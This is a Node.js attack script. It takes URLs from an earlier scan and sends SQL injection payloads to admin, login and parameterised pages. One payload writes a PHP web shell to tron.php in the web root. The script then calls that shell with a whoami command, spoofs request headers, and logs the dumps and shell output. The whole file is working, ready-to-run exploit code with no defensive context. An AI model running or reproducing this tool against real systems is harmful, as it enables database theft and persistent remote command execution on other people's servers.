// autoExploitFromVuln.js - Web Shell Deployment Patch
const axios = require('axios');
const fs = require('fs');

const resultFile = "vuln_result.json"; // output file to save result from execution
const inputFile = "active_links.json"; // input from previous scan

const sqliPayloads = [
  "' UNION SELECT NULL, user(), database(), version() --",
  "' UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/tron.php' --"
];

const headers = {
  'User-Agent': 'Mozilla/5.0 (TRON-HOKAGE)',
  'Referer': 'https://google.com',
  'X-Forwarded-For': '127.0.0.1'
};

async function exploitVulns() {
  if (!fs.existsSync(inputFile)) {
    console.error("‚ùå Missing active_links.json file");
    process.exit(1);
  }

  const links = JSON.parse(fs.readFileSync(inputFile, "utf-8"));
  let results = [];

  for (const entry of links) {
    const url = entry.url;
    if (!url.includes("admin") && !url.includes("login") && !url.includes("?")) continue;

    for (const payload of sqliPayloads) {
      const targetUrl = url + encodeURIComponent(payload);
      try {
        const res = await axios.get(targetUrl, { headers });
        const data = typeof res.data === 'object' ? JSON.stringify(res.data) : res.data.toString();
        const snippet = data.slice(0, 300);
        const dumpFile = `dump_SQLi_${Date.now()}.txt`;
        fs.writeFileSync(dumpFile, snippet);
        results.push({ url: targetUrl, type: "SQLi", status: res.status, dump: dumpFile });
        console.log(`‚öîÔ∏è [SQLi] ${res.status} - ${targetUrl} ‚Üí Dump saved to ${dumpFile}`);
      } catch (e) {
        results.push({ url: targetUrl, type: "SQLi", status: e.response?.status || 'ERR', response: e.message });
        console.log(`‚ùå [SQLi] ${e.response?.status || 'ERR'} - ${targetUrl}`);
      }
    }

    // After trying SQLi shell drop, attempt to access shell
    const shellUrl = new URL("/tron.php", url).origin + "/tron.php?cmd=whoami";
    try {
      const shellRes = await axios.get(shellUrl, { headers });
      console.log(`üß† [SHELL] Accessed at ${shellUrl} ‚Üí Response:`, shellRes.data.slice(0, 100));
      results.push({ url: shellUrl, type: "SHELL", status: shellRes.status, output: shellRes.data });
    } catch (e) {
      console.log(`‚ùå [SHELL] Failed to access tron.php`);
      results.push({ url: shellUrl, type: "SHELL", status: "NOT FOUND" });
    }
  }

  fs.writeFileSync(resultFile, JSON.stringify(results, null, 2));
  console.log(`\nüìÅ Exploit + WebShell result saved to ${resultFile}`);
}

exploitVulns();
